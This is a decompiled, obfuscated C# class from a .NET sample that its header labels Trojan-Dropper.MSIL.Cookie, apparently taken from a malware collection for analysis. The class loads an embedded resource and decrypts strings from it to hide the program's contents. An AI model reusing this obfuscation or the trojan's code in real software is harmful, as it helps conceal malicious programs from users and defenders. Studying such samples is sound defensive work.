// Decompiled with JetBrains decompiler
// Type: .
// Assembly: x1x1x1x1x1x1x1x1x, Version=2.1.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 41668E8C-580E-4768-8756-53F1BC9ECCC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Dropper.MSIL.Cookie.e-e73a14fc8e256d29203c913eab14be6d27a7cfbe002ae112a4b3e56f2707759e.exe

using \u0001;
using \u0002;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal sealed class \u0004
  {
    private static string \u0001 = "1";
    private static string \u0002 = "20";
    private static byte[] \u0001 = (byte[]) null;
    private static Hashtable \u0001 = (Hashtable) null;
    private static bool \u0001 = false;
    private static int \u0001 = 0;

    public static string \u0003([In] int obj0)
    {
      obj0 -= \u0004.\u0001;
      if (\u0004.\u0001)
      {
        string str = (string) \u001C\u0003.\u007E\u008D\u0004((object) \u0004.\u0001, (object) obj0);
        if (str != null)
          return str;
      }
      int num1 = obj0;
      byte[] numArray1 = \u0004.\u0001;
      int index1 = num1;
      int num2 = index1 + 1;
      int num3 = (int) numArray1[index1];
      int num4;
      if ((num3 & 128) == 0)
      {
        num4 = num3;
        if (num4 == 0)
          return string.Empty;
      }
      else if ((num3 & 64) == 0)
      {
        num4 = ((num3 & 63) << 8) + (int) \u0004.\u0001[num2++];
      }
      else
      {
        int num5 = (num3 & 31) << 24;
        byte[] numArray2 = \u0004.\u0001;
        int index2 = num2;
        int num6 = index2 + 1;
        int num7 = (int) numArray2[index2] << 16;
        int num8 = num5 + num7;
        byte[] numArray3 = \u0004.\u0001;
        int index3 = num6;
        int num9 = index3 + 1;
        int num10 = (int) numArray3[index3] << 8;
        int num11 = num8 + num10;
        byte[] numArray4 = \u0004.\u0001;
        int index4 = num9;
        num2 = index4 + 1;
        int num12 = (int) numArray4[index4];
        num4 = num11 + num12;
      }
      try
      {
        byte[] numArray5 = \u0008\u0004.\u0002\u0004(\u008F\u0002.\u007E\u0010\u0005((object) \u0082\u0004.\u0011\u0005(), \u0004.\u0001, num2, num4));
        string str = \u0093\u0004.\u001F\u0003(\u008F\u0002.\u007E\u0010\u0005((object) \u0082\u0004.\u0011\u0005(), numArray5, 0, numArray5.Length));
        if (\u0004.\u0001)
        {
          try
          {
            \u0017\u0004.\u007E\u008B\u0004((object) \u0004.\u0001, (object) obj0, (object) str);
          }
          catch
          {
          }
        }
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static \u0004()
    {
      if (\u001A\u0002.\u0007\u0003(\u0004.\u0001, "1"))
      {
        \u0004.\u0001 = true;
        \u0004.\u0001 = new Hashtable();
      }
      \u0004.\u0001 = \u009D\u0004.\u009E\u0003(\u0004.\u0002);
      Assembly assembly = \u009B\u0003.\u0098\u0004();
      Stream stream = \u008C\u0002.\u007E\u0092\u0004((object) assembly, "{41668e8c-580e-4768-8756-53f1bc9eccc7}");
      try
      {
        int length = \u0015\u0004.\u009D\u0003(\u001A\u0003.\u007E\u0081\u0005((object) stream));
        byte[] numArray = new byte[length];
        int num = \u0098\u0002.\u007E\u0086\u0005((object) stream, numArray, 0, length);
        \u0004.\u0001 = \u0003.\u0003(numArray);
        \u001E\u0004.\u007E\u0083\u0005((object) stream);
      }
      finally
      {
        if (stream != null)
          \u001E\u0004.\u007E\u0006\u0003((object) stream);
      }
    }
  }
}
